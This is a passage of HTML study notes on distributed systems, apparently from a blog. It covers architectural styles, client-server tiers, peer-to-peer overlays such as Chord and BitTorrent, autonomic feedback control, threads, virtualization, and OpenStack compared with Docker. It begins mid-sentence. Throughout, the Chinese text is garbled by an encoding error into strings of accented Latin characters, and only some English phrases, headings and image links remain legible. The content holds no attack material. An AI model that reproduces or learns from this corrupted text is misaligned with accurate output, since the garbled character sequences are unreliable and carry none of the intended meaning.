¹æ®ç»„ä»¶ã€ç»„ä»¶ä¹‹é—´ç›¸äº’çš„è¿æ¥æ–¹å¼ã€ç»„ä»¶ä¹‹é—´çš„æ•°æ®äº¤æ¢ä»¥åŠè¿™äº›å…ƒç´ å¦‚ä½•é›†æˆåˆ°ä¸€ä¸ªç³»ç»Ÿä¸­æ¥å®šä¹‰ã€‚</p>
<ul>
<li><strong>ç»„ä»¶Component</strong>ï¼šä¸€ä¸ªæ¨¡å—å•å…ƒï¼Œå¯ä»¥æä¾›è‰¯å¥½å®šä¹‰æ¥å£ï¼Œåœ¨å…¶ç¯å¢ƒä¸­æ˜¯å¯æ›¿æ¢çš„ã€‚</li>
<li><strong>é“¾æ¥å™¨Connector</strong>ï¼šåœ¨ç»„ä»¶ä¹‹é—´ä¼ é€’é€šä¿¡ã€ä½¿ç»„ä»¶ç›¸äº’åè°ƒå’Œåä½œã€‚</li>
</ul>
<p>æ ¹æ®ç»„ä»¶å’Œè¿æ¥å™¨çš„ä½¿ç”¨ï¼Œåˆ’åˆ†æˆ<strong>ä¸åŒä½“ç³»ç»“æ„</strong>ï¼š</p>
<ol>
<li><p>åˆ†å±‚ä½“ç³»ç»“æ„</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451741.png" alt="åˆ†å±‚ä½“ç³»ç»“æ„æ ·å¼"></p>
<p>ç»„ä»¶ç»„æˆäº†ä¸åŒçš„å±‚ï¼Œå…¶ä¸­Liå±‚ä¸­çš„ç»„å‘˜å¯ä»¥è°ƒç”¨ä¸‹é¢çš„å±‚Liâˆ’1ã€‚</p>
</li>
<li><p>åŸºäºå¯¹è±¡çš„ä½“ç³»ç»“æ„</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451742.png" alt="å¯¹è±¡ä½“ç³»ç»“æ„æ ·å¼"></p>
<p>æ¯ä¸ªå¯¹è±¡éƒ½å¯¹åº”ä¸€ä¸ªç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶æ˜¯é€šè¿‡(è¿œç¨‹)è¿‡ç¨‹è°ƒç”¨æœºåˆ¶æ¥è¿æ¥çš„ã€‚</p>
</li>
<li><p>ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä½“ç³»ç»“æ„</p>
<p>é€šè¿‡ä¸€ä¸ªå…¬ç”¨(è¢«åŠ¨æˆ–ä¸»åŠ¨çš„)ä»“åº“è¿›è¡Œé€šä¿¡ã€‚</p>
</li>
<li><p>åŸºäºäº‹ä»¶çš„ä½“ç³»ç»“æ„</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451743.png" alt="åŸºäºäº‹ä»¶çš„ä½“ç³»ç»“æ„æ ·å¼"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451744.png" alt="åŸºäºå…±äº«æ•°æ®ç©ºé—´çš„ä½“ç³»ç»“æ„æ ·å¼"></p>
<p>é€šè¿‡äº‹ä»¶çš„ä¼ æ’­æ¥é€šä¿¡ã€‚</p>
</li>
</ol>
<h2 id="ç³»ç»Ÿä½“ç³»ç»“æ„"><a href="#ç³»ç»Ÿä½“ç³»ç»“æ„" class="headerlink" title="ç³»ç»Ÿä½“ç³»ç»“æ„"></a>ç³»ç»Ÿä½“ç³»ç»“æ„</h2><h3 id="é›†ä¸­å¼ä½“ç³»ç»“æ„"><a href="#é›†ä¸­å¼ä½“ç³»ç»“æ„" class="headerlink" title="é›†ä¸­å¼ä½“ç³»ç»“æ„"></a>é›†ä¸­å¼ä½“ç³»ç»“æ„</h3><p><strong>å®¢æˆ·-æœåŠ¡å™¨</strong>çš„äº¤äº’æ–¹å¼ï¼Œåˆè¢«ç§°ä¸º<strong>è¯·æ±‚-å›å¤</strong>è¡Œä¸ºã€‚</p>
<p><strong>å¹‚ç­‰æ“ä½œ</strong>ï¼šå¦‚æœæŸä¸ªæ“ä½œå¯ä»¥é‡å¤å¤šæ¬¡è€Œæ— å®³å¤„ï¼Œé‚£ä¹ˆç§°å®ƒæ˜¯<strong>å¹‚ç­‰</strong>çš„ã€‚</p>
<h4 id="åº”ç”¨åˆ†å±‚"><a href="#åº”ç”¨åˆ†å±‚" class="headerlink" title="åº”ç”¨åˆ†å±‚"></a>åº”ç”¨åˆ†å±‚</h4><p><strong>å®¢æˆ·-æœåŠ¡å™¨</strong>æ¨¡å‹åˆ†ä¸ºä¸‰å±‚ï¼š</p>
<ol>
<li>ç”¨æˆ·æ¥å£å±‚ï¼Œç”¨äºä¸ç”¨æˆ·äº¤äº’ï¼›</li>
<li>å¤„ç†å±‚ï¼ŒåŒ…å«åº”ç”¨ç¨‹åºï¼›</li>
<li>æ•°æ®å±‚ï¼Œç®¡ç†è¦ä½¿ç”¨çš„å®é™…æ•°æ®ã€‚</li>
</ol>
<h4 id="å¤šå±‚ä½“ç³»ç»“æ„"><a href="#å¤šå±‚ä½“ç³»ç»“æ„" class="headerlink" title="å¤šå±‚ä½“ç³»ç»“æ„"></a>å¤šå±‚ä½“ç³»ç»“æ„</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451745.png" alt="å„ç§å®¢æˆ·-æœåŠ¡å™¨ç»„ç»‡ç»“æ„"></p>
<h3 id="éé›†ä¸­å¼ä½“ç³»ç»“æ„"><a href="#éé›†ä¸­å¼ä½“ç³»ç»“æ„" class="headerlink" title="éé›†ä¸­å¼ä½“ç³»ç»“æ„"></a>éé›†ä¸­å¼ä½“ç³»ç»“æ„</h3><h4 id="ç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»ç»“æ„"><a href="#ç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»ç»“æ„" class="headerlink" title="ç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»ç»“æ„"></a>ç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»ç»“æ„</h4><p><strong>ç‚¹å¯¹ç‚¹</strong>ä½“ç³»ç»“æ„ï¼šåœ¨ç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»æœºæ„ä¸­ï¼Œè¦†ç›–ç½‘ç»œæ˜¯ä¸€ä¸ªç¡®å®šæ€§çš„è¿‡ç¨‹æ¥æ„æˆçš„ã€‚è¿™ä¸ªä½¿ç”¨æœ€å¤šçš„è¿›ç¨‹æ˜¯é€šè¿‡ä¸€ä¸ª<strong>åˆ†å¸ƒå¼å“ˆå¸Œè¡¨</strong>æ¥ç»„ç»‡è¿›ç¨‹çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451746.png" alt="Chordç³»ç»Ÿä¸­ï¼Œä»æ•°æ®é¡¹åˆ°ç»“ç‚¹çš„æ˜ å°„"></p>
<h4 id="éç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»ç»“æ„"><a href="#éç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»ç»“æ„" class="headerlink" title="éç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»ç»“æ„"></a>éç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ä½“ç³»ç»“æ„</h4><p>å¾ˆå¤šéç»“æ„åŒ–çš„ç‚¹å¯¹ç‚¹ç³»ç»Ÿçš„ä¸€ä¸ªç›®æ ‡å°±æ˜¯æ„é€ ä¸€ä¸ªç±»ä¼¼äº<strong>éšæœºå›¾</strong>çš„è¦†ç›–ç½‘ç»œã€‚</p>
<h4 id="è¶…çº§å¯¹ç­‰ä½“"><a href="#è¶…çº§å¯¹ç­‰ä½“" class="headerlink" title="è¶…çº§å¯¹ç­‰ä½“"></a>è¶…çº§å¯¹ç­‰ä½“</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451747.png" alt="è¶…çº§å¯¹ç­‰ä½“ç½‘ç»œä¸­ç»“ç‚¹çš„åˆ†å±‚ç»„ç»‡ç»“æ„"></p>
<p>èƒ½ç»´æŠ¤ä¸€ä¸ªç´¢å¼•æˆ–è€…å……å½“ä¸€ä¸ªä»£ç†ç¨‹åºçš„ç»“ç‚¹ç§°ä¸º<strong>è¶…çº§å¯¹ç­‰ä½“</strong>ï¼Œæ§åˆ¶ç®¡ç†å¤šä¸ªå¸¸è§„å¯¹ç­‰ä½“ã€‚æ¯ä¸ªå¸¸è§„å¯¹ç­‰ä½“ä½œä¸ºä¸€ä¸ªå®¢æˆ·è¿æ¥åˆ°è¶…çº§å¯¹ç­‰ä½“ã€‚</p>
<h3 id="æ··åˆä½“ç³»ç»“æ„"><a href="#æ··åˆä½“ç³»ç»“æ„" class="headerlink" title="æ··åˆä½“ç³»ç»“æ„"></a>æ··åˆä½“ç³»ç»“æ„</h3><h4 id="è¾¹ç•ŒæœåŠ¡å™¨ç³»ç»Ÿ"><a href="#è¾¹ç•ŒæœåŠ¡å™¨ç³»ç»Ÿ" class="headerlink" title="è¾¹ç•ŒæœåŠ¡å™¨ç³»ç»Ÿ"></a>è¾¹ç•ŒæœåŠ¡å™¨ç³»ç»Ÿ</h4><p>è¿™ç§ç³»ç»Ÿéƒ¨ç½²åœ¨å› ç‰¹ç½‘ä¸­ï¼ŒæœåŠ¡å™¨æ”¾ç½®åœ¨ç½‘ç»œçš„â€œè¾¹ç•Œâ€ã€‚è¿™ç§è¾¹ç•Œæ˜¯ç”±ä¼ä¸šç½‘ç»œå’Œå®é™…çš„å› ç‰¹ç½‘ä¹‹é—´çš„åˆ†ç•Œçº¿å½¢æˆçš„ã€‚ä¾‹å¦‚ï¼Œå› ç‰¹ç½‘æœåŠ¡æä¾›å•†ã€‚å®¶åº­ç»ˆç«¯ç”¨æˆ·é€šè¿‡ISPè¿æ¥åˆ°å› ç‰¹ç½‘ï¼Œè¯¥ISPå°±å¯ä»¥è®¤ä¸ºæ˜¯å› ç‰¹ç½‘çš„è¾¹ç•Œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451748.png" alt="æŠŠå› ç‰¹ç½‘çœ‹åšæ˜¯ç”±ä¸€ç³»åˆ—ä¾¿æ·æœåŠ¡å™¨ç»„æˆçš„"></p>
<h4 id="åä½œåˆ†å¸ƒå¼ç³»ç»Ÿ"><a href="#åä½œåˆ†å¸ƒå¼ç³»ç»Ÿ" class="headerlink" title="åä½œåˆ†å¸ƒå¼ç³»ç»Ÿ"></a>åä½œåˆ†å¸ƒå¼ç³»ç»Ÿ</h4><p><strong>æ··åˆç»“æ„</strong>ä¸»è¦éƒ¨ç½²åœ¨åä½œå¼åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ã€‚åœ¨å¾ˆå¤šé‡è¦çš„ç³»ç»Ÿä¸­ï¼Œä¸»è¦é—®é¢˜æ˜¯å…ˆå¯åŠ¨èµ·æ¥ï¼Œå› ä¸ºç»å¸¸ä¼šéƒ¨ç½²ä¸€ä¸ªä¼ é€’çš„å®¢æˆ·-æœåŠ¡å™¨ç»“æ„ã€‚ä¸€æ—¦æŸä¸ªç»“ç‚¹è¦åŠ å…¥ç³»ç»Ÿï¼Œå°±å¯ä»¥ä½¿ç”¨å®Œå…¨éé›†ä¸­å¼çš„ç»„ç»‡ç»“æ„ï¼Œç”¨äºåä½œã€‚</p>
<p><strong>BitTorrent</strong>æ˜¯ä¸€ä¸ªç‚¹å¯¹ç‚¹çš„æ–‡ä»¶ä¸‹è½½ç³»ç»Ÿã€‚åŸºæœ¬æ€æƒ³æ˜¯ï¼Œå½“ä¸€ä¸ªç»ˆç«¯ç”¨æˆ·è¦æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶æ—¶ï¼Œä»–å¯ä»¥ä»å…¶ä»–ç”¨æˆ·é‚£é‡Œä¸‹è½½æ–‡ä»¶å—ï¼Œç›´åˆ°æ‰€ä¸‹è½½çš„æ–‡ä»¶å—èƒ½å¤Ÿç»„è£…æˆå®Œæ•´çš„æ–‡ä»¶ä¸ºæ­¢ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451749.png" alt="img"></p>
<h2 id="åˆ†å¸ƒå¼ç³»ç»Ÿçš„è‡ªæˆ‘ç®¡ç†"><a href="#åˆ†å¸ƒå¼ç³»ç»Ÿçš„è‡ªæˆ‘ç®¡ç†" class="headerlink" title="åˆ†å¸ƒå¼ç³»ç»Ÿçš„è‡ªæˆ‘ç®¡ç†"></a>åˆ†å¸ƒå¼ç³»ç»Ÿçš„è‡ªæˆ‘ç®¡ç†</h2><p><strong>è‡ªæ²»è®¡ç®—</strong>ï¼šä»¥é«˜çº§åé¦ˆæ§åˆ¶ç³»ç»Ÿçš„å½¢å¼æ¥ç»„ç»‡åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå…è®¸è‡ªåŠ¨è‡ªé€‚åº”å˜æ¢ã€‚ä¹Ÿå«åš<strong>è‡ªä¸»</strong>ç³»ç»Ÿã€‚</p>
<p>è‡ªé€‚åº”çš„å¤šæ ·æ€§ï¼š</p>
<ul>
<li>è‡ªæˆ‘ç®¡ç†</li>
<li>è‡ªæˆ‘æ¢å¤</li>
<li>è‡ªæˆ‘é…ç½®</li>
<li>è‡ªæˆ‘ä¼˜åŒ–</li>
<li>ç­‰</li>
</ul>
<h3 id="åé¦ˆæ§åˆ¶æ¨¡å‹"><a href="#åé¦ˆæ§åˆ¶æ¨¡å‹" class="headerlink" title="åé¦ˆæ§åˆ¶æ¨¡å‹"></a>åé¦ˆæ§åˆ¶æ¨¡å‹</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451750.png" alt="img"></p>
<p>åé¦ˆæ§åˆ¶ç³»ç»Ÿçš„æ ¸å¿ƒç”±éœ€è¦ç®¡ç†çš„ç»„ä»¶å½¢æˆã€‚è¿™äº›ç»„ä»¶èƒ½é€šè¿‡å¯æ§è¾“å…¥å‚æ•°é©±åŠ¨ï¼Œå—å¹²æ‰°æˆ–å™ªå£°è¾“å…¥çš„å½±å“ã€‚</p>
<p>ç³»ç»Ÿæœ¬èº«éœ€è¦è¢«ç›‘è§†ï¼Œå› æ­¤éœ€è¦å¯¹ç³»ç»Ÿå„ä¸ªæ–¹é¢è¿›è¡Œæµ‹é‡ã€‚ä½†æ˜¯å®é™…æµ‹é‡å¾ˆéš¾åšåˆ°ï¼Œå°±éœ€è¦ä¸€ä¸ªé€»è¾‘<strong>å°ºåº¦é¢„æµ‹ç»„ä»¶</strong>ã€‚</p>
<p>æ§åˆ¶å¾ªç¯çš„æ ¸å¿ƒéƒ¨åˆ†æ˜¯åé¦ˆåˆ†æç»„ä»¶ï¼Œåˆ†æä¸Šè¿°æµ‹é‡å€¼ï¼Œå¹¶æŠŠå®ƒä»¬ä¸å‚è€ƒå€¼è¿›è¡Œæ¯”è¾ƒã€‚åŒ…å«äº†å†³å®šè‡ªé€‚åº”çš„å„ç§ç®—æ³•ã€‚</p>
<hr>
<h1 id="Chapter-3-è¿›ç¨‹"><a href="#Chapter-3-è¿›ç¨‹" class="headerlink" title="Chapter 3 è¿›ç¨‹"></a>Chapter 3 è¿›ç¨‹</h1><h2 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h2><p><strong>ä¸ºä»€ä¹ˆ</strong>è¦ä½¿ç”¨çº¿ç¨‹ï¼Ÿ</p>
<p>è™½ç„¶è¿›ç¨‹æ„æˆäº†åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„åŸºæœ¬ç»„æˆå•å…ƒï¼Œä½†æ˜¯å®è·µè¡¨æ˜ï¼Œæ“ä½œç³»ç»Ÿæä¾›çš„ç”¨äºæ„å»ºåˆ†å¸ƒå¼ç³»ç»Ÿçš„è¿›ç¨‹åœ¨ç²’åº¦ä¸Šè¿˜æ˜¯å¤ªå¤§äº†ã€‚è€Œå°±ç²’åº¦è€Œè¨€ï¼Œå°†æ¯ä¸ªè¿›ç¨‹ç»†åˆ†ä¸ºè‹¥å¹²æ§åˆ¶çº¿ç¨‹çš„å½¢å¼åˆ™æ›´åŠ åˆé€‚ï¼Œå¯ä»¥ä½¿æ„å»ºåˆ†å¸ƒå¼åº”ç”¨ç¨‹åºå˜å¾—æ›´åŠ æ–¹ä¾¿ï¼Œè·å¾—æ›´å¥½çš„æ€§èƒ½ã€‚</p>
<p>çº¿ç¨‹ä¸è¿›ç¨‹<strong>ä¸åŒ</strong>ä¹‹å¤„ï¼Ÿ</p>
<ul>
<li>çº¿ç¨‹ä¸ä¼šä»¥æ€§èƒ½é™ä½ä¸ºä»£ä»·ï¼Œæ¢å–é«˜åº¦çš„å¹¶å‘é€æ˜æ€§ã€‚</li>
<li>çº¿ç¨‹ä¸Šä¸‹æ–‡ä¸€èˆ¬åªåŒ…å«å­˜å‚¨åœ¨å¯„å­˜å™¨å’Œå­˜å‚¨å™¨ä¸­çš„å°½å¯èƒ½å°‘çš„ä¿¡æ¯ï¼Œä»…ä»…ç”¨äºæ‰§è¡Œä¸€ç³»åˆ—æŒ‡ä»¤ã€‚</li>
</ul>
<h3 id="åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„çº¿ç¨‹"><a href="#åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„çº¿ç¨‹" class="headerlink" title="åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„çº¿ç¨‹"></a>åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„çº¿ç¨‹</h3><h4 id="å¤šçº¿ç¨‹å®¢æˆ·ç«¯"><a href="#å¤šçº¿ç¨‹å®¢æˆ·ç«¯" class="headerlink" title="å¤šçº¿ç¨‹å®¢æˆ·ç«¯"></a>å¤šçº¿ç¨‹å®¢æˆ·ç«¯</h4><p>å¤šçº¿ç¨‹å®¢æˆ·ç«¯æœ€å¤§çš„é—®é¢˜æ˜¯å¦‚ä½•éšè—ç½‘ç»œå»¶æ—¶ã€‚å¸¸è§„æ–¹æ³•æ˜¯å¯åŠ¨ç½‘ç»œé€šä¿¡çº¿ç¨‹åï¼Œç«‹å³è¿›è¡Œå…¶ä»–å·¥ä½œã€‚</p>
<h4 id="å¤šçº¿ç¨‹æœåŠ¡å™¨"><a href="#å¤šçº¿ç¨‹æœåŠ¡å™¨" class="headerlink" title="å¤šçº¿ç¨‹æœåŠ¡å™¨"></a>å¤šçº¿ç¨‹æœåŠ¡å™¨</h4><p>åœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨å¤šçº¿ç¨‹æŠ€æœ¯æœ‰å¾ˆå¤šå¥½å¤„ï¼š</p>
<ol>
<li><p>å¯ä»¥æå‡æ€§èƒ½</p>
<ul>
<li>å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹å¤„ç†è¯·æ±‚æ¯”å¯åŠ¨è¿›ç¨‹å¼€é”€æ›´å°</li>
<li>å¯ä»¥éšè—ç½‘ç»œå»¶æ—¶ã€‚å½“æœ‰è¯·æ±‚åˆ°æ¥æ—¶ï¼Œä¹Ÿå¯ä»¥åšå…¶ä»–å·¥ä½œã€‚</li>
</ul>
</li>
<li><p>ç»“æ„æ›´ä¼˜</p>
<p>å¤šçº¿ç¨‹ç¨‹åºçš„ç»“æ„ä¼šæ›´ç®€å•ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451751.png" alt="ä»¥åˆ†å‘å™¨/å·¥ä½œè€…æ¨¡å‹ç»„ç»‡èµ·æ¥çš„å¤šçº¿ç¨‹æœåŠ¡å™¨"></p>
<p>ä¸Šå›¾ä¸­ï¼Œ<strong>åˆ†å‘å™¨çº¿ç¨‹</strong>è¯»å–æ–‡ä»¶æ“ä½œè¯·æ±‚ï¼Œéšåé€‰æ‹©ä¸€ä¸ªç©ºé—²çš„<strong>å·¥ä½œè€…çº¿ç¨‹</strong>æ¥å¤„ç†è¯·æ±‚ã€‚</p>
</li>
</ol>
<h2 id="è™šæ‹ŸåŒ–"><a href="#è™šæ‹ŸåŒ–" class="headerlink" title="è™šæ‹ŸåŒ–"></a>è™šæ‹ŸåŒ–</h2><blockquote>
<p>è™šæ‹ŸåŒ–ï¼šæŠŠä¸€æ ·ä¸œè¥¿çœ‹æˆå¦ä¸€ä¸ªä¸œè¥¿</p>
</blockquote>
<ul>
<li>å¤šè™šä¸€ï¼Œå¤šä¸ªèµ„æºè™šæ‹Ÿæ•´åˆæˆä¸€ä¸ªèµ„æºï¼›</li>
<li>ä¸€è™šå¤šï¼ŒæŠŠä¸€ä¸ªèµ„æºè™šæ‹Ÿæˆå¤šä¸ªï¼Œä¾›å¤šç”¨æˆ·ä½¿ç”¨ï¼Œå¯å¼¥è¡¥è¿è¥æˆæœ¬ï¼›</li>
<li>åšéš”ç¦»ï¼Œåº•å±‚å’Œä¸Šå±‚ä¹‹é—´ä¸å¯è§ï¼Œ<strong>ä¾¿äºç§»æ¤</strong>ï¼›æ—©æœŸç”¨äºç¨‹åºè¿ç§»ã€‚</li>
</ul>
<h3 id="è™šæ‹Ÿæœºä½“ç³»ç»“æ„"><a href="#è™šæ‹Ÿæœºä½“ç³»ç»“æ„" class="headerlink" title="è™šæ‹Ÿæœºä½“ç³»ç»“æ„"></a>è™šæ‹Ÿæœºä½“ç³»ç»“æ„</h3><p>è®¡ç®—æœºç³»ç»Ÿé€šå¸¸åœ¨4ä¸ªä¸åŒå±‚æ¬¡æä¾›4ä¸ªä¸åŒçš„ç•Œé¢ï¼š</p>
<ol>
<li><p>ç”±<strong>æœºå™¨æŒ‡ä»¤</strong>ç»„æˆï¼Œä»»ä½•ç¨‹åºéƒ½å¯æ¿€èµ·çš„ï¼Œä»‹äºç¡¬ä»¶è½¯ä»¶ä¹‹é—´çš„ç•Œé¢ï¼›</p>
<p>Interface between hardware and software, non-privileged.</p>
</li>
<li><p>ç”±<strong>æœºå™¨æŒ‡ä»¤</strong>ç»„æˆï¼Œåªæœ‰ç‰¹æƒç¨‹åº(e.g æ“ä½œç³»ç»Ÿ)æ‰å¯æ¿€èµ·çš„ç•Œé¢ï¼›</p>
<p>Interface between hardware and software, privileged.</p>
</li>
<li><p>æœ‰æ“ä½œç³»ç»Ÿæä¾›çš„<strong>ç³»ç»Ÿè°ƒç”¨</strong>ç»„æˆçš„ç•Œé¢ï¼›</p>
<p>System calls.</p>
</li>
<li><p>ç”±åº“è°ƒç”¨ç»„æˆçš„ç•Œé¢ï¼Œé€šå¸¸å½¢æˆäº†æ‰€è°“çš„**åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£(API)**ã€‚</p>
<p>Libraries functions.</p>
</li>
</ol>
<p><strong>è€Œè™šæ‹ŸåŒ–çš„å®è´¨å°±æ˜¯æ¨¡ä»¿è¿™äº›ç•Œé¢çš„è¡Œä¸ºã€‚</strong></p>
<ul>
<li>æŒ‡ä»¤é›†è™šæ‹ŸåŒ–çš„ä»£ä»·å¾ˆé«˜ï¼›</li>
<li>ç¡¬ä»¶è™šæ‹ŸåŒ–ï¼Œæ€§èƒ½æŸå¤±ä¸å¤§ï¼Œæ˜¯è™šæ‹ŸåŒ–çš„ä¸»æµã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451752.png" alt="4ä¸ªä¸åŒå±‚æ¬¡çš„ç•Œé¢"></p>
<h3 id="è™šæ‹Ÿæœºçš„ä¸¤ç§æ–¹å¼"><a href="#è™šæ‹Ÿæœºçš„ä¸¤ç§æ–¹å¼" class="headerlink" title="è™šæ‹Ÿæœºçš„ä¸¤ç§æ–¹å¼"></a>è™šæ‹Ÿæœºçš„ä¸¤ç§æ–¹å¼</h3><ol>
<li><p>æ„å»ºä¸€ä¸ªè¿è¡Œæ—¶ï¼ˆruntimeï¼‰ç³»ç»Ÿï¼Œå®è´¨ä¸Šæä¾›äº†ä¸€å¥—æŠ½è±¡æŒ‡ä»¤é›†æ¥æ‰§è¡Œç¨‹åºã€‚ä¾‹å¦‚Javaè™šæ‹Ÿæœºï¼Œå°†æŒ‡ä»¤è¿›è¡Œç¿»è¯‘ï¼Œä½¿ç”¨åº“è™šæ‹ŸåŒ–ï¼›è¿˜æœ‰ä½¿ç”¨Windowsæ“ä½œç³»ç»Ÿæ¨¡æ‹ŸLinuxï¼Œæ˜¯OSè™šæ‹ŸåŒ–ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451753.png" alt="img"></p>
</li>
<li><p>ä½¿ç”¨<strong>è™šæ‹Ÿæœºç›‘è§†å™¨ï¼ˆVMMï¼‰</strong>è¿™ä¸€å±‚ï¼Œè™šæ‹Ÿæœºç›‘è§†å™¨å®Œå…¨å±è”½ç¡¬ä»¶ï¼Œä½†æä¾›ä¸€ä¸ªåŒæ ·æŒ‡ä»¤é›†ï¼ˆæˆ–å…¶ä»–ç¡¬ä»¶ï¼‰çš„ç•Œé¢ã€‚è¿™ä¸ªç•Œé¢å¯ä»¥åŒæ—¶æä¾›ç»™å¤šä¸ªç¨‹åºï¼Œå¯ä»¥æœ‰å¤šä¸ªä¸åŒçš„æ“ä½œç³»ç»Ÿç‹¬ç«‹å¹¶å‘åœ°è¿è¡Œåœ¨åŒä¸€å¹³å°ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451754.png" alt="è™šæ‹Ÿæœºç›‘è§†å™¨"></p>
</li>
</ol>
<h3 id="è™šæ‹ŸåŒ–-v-s-å®¹å™¨"><a href="#è™šæ‹ŸåŒ–-v-s-å®¹å™¨" class="headerlink" title="è™šæ‹ŸåŒ– v.s. å®¹å™¨"></a>è™šæ‹ŸåŒ– v.s. å®¹å™¨</h3><h4 id="è™šæ‹ŸåŒ–ï¼šOpenStack"><a href="#è™šæ‹ŸåŒ–ï¼šOpenStack" class="headerlink" title="è™šæ‹ŸåŒ–ï¼šOpenStack"></a>è™šæ‹ŸåŒ–ï¼šOpenStack</h4><p>ä½¿ç”¨OpenStackåšè™šæ‹ŸåŒ–æ—¶ï¼Œå®ƒå¯ä»¥å°†æ“ä½œç³»ç»Ÿéƒ½ä¸€å¹¶æ‰“åŒ…å¥½ï¼Œå„ä¸ªè™šæ‹Ÿæœºä¹‹é—´å®Œå…¨éš”ç¦»ï¼Œäº’ä¸å¹²æ¶‰ã€‚</p>
<p>å±‚æ¬¡ç»“æ„ï¼š</p>
<ul>
<li>æœ€é¡¶å±‚åº”ç”¨</li>
<li>æ“ä½œç³»ç»Ÿ(ä»»æ„çš„æ“ä½œç³»ç»Ÿ)</li>
<li>OpenStack</li>
<li>åº•å±‚ç¡¬ä»¶</li>
</ul>
<h4 id="å®¹å™¨ï¼šDocker"><a href="#å®¹å™¨ï¼šDocker" class="headerlink" title="å®¹å™¨ï¼šDocker"></a>å®¹å™¨ï¼šDocker</h4><p>Dockeræ˜¯åŸºäº**è¿›ç¨‹å®¹å™¨(Process container)**çš„è½»é‡çº§VMè§£å†³æ–¹æ¡ˆï¼Œç”¨æ¯”è™šæ‹ŸæœºæŠ€æœ¯å°‘å¾ˆå¤šçš„èµ„æºæ¶ˆè€—å®ç°äº†ç±»ä¼¼äºè™šæ‹Ÿæœºçš„å¯¹CPUã€ç£ç›˜ã€ç½‘ç»œçš„éš”ç¦»ã€‚</p>
<p>å±‚æ¬¡ç»“æ„ï¼š</p>
<ul>
<li>æœ€é¡¶å±‚åº”ç”¨</li>
<li>Docker</li>
<li>æ“ä½œç³»ç»Ÿ(ä»…é™Linux)</li>
<li>åº•å±‚ç¡¬ä»¶</li>
</ul>
<h4 id="OpenStackä¸Dockerçš„åŒºåˆ«"><a href="#OpenStackä¸Dockerçš„åŒºåˆ«" class="headerlink" title="OpenStackä¸Dockerçš„åŒºåˆ«"></a>OpenStackä¸Dockerçš„åŒºåˆ«</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451755.png" alt="img"></p>
<h2 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h2><h3 id="å®¢æˆ·ç«¯è½¯ä»¶ä¸åˆ†å¸ƒé€æ˜æ€§"><a href="#å®¢æˆ·ç«¯è½¯ä»¶ä¸åˆ†å¸ƒé€æ˜æ€§" class="headerlink" title="å®¢æˆ·ç«¯è½¯ä»¶ä¸åˆ†å¸ƒé€æ˜æ€§"></a>å®¢æˆ·ç«¯è½¯ä»¶ä¸åˆ†å¸ƒé€æ˜æ€§</h3><p>ä¸€ä¸ªå¸¦æœ‰å‰¯æœ¬æœåŠ¡å™¨çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¯ä»¥é€šè¿‡å°†è°ƒç”¨è¯·æ±‚è½¬å‘ç»™æ¯ä¸€ä¸ªæœåŠ¡å™¨çš„å‰¯æœ¬æ¥è¾¾åˆ°å¤åˆ¶é€æ˜æ€§ã€‚å®¢æˆ·ä»£ç†å°†ä¼šé€æ˜åœ°å¶ç´ å³æ‰€æœ‰å¯¹è±¡çš„å“åº”ï¼Œå¹¶ä¸”åªå‘å®¢æˆ·åº”ç”¨ç¨‹åºé€å›ä¸€ä¸ªè¿”å›å€¼ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451756.png" alt="img"></p>
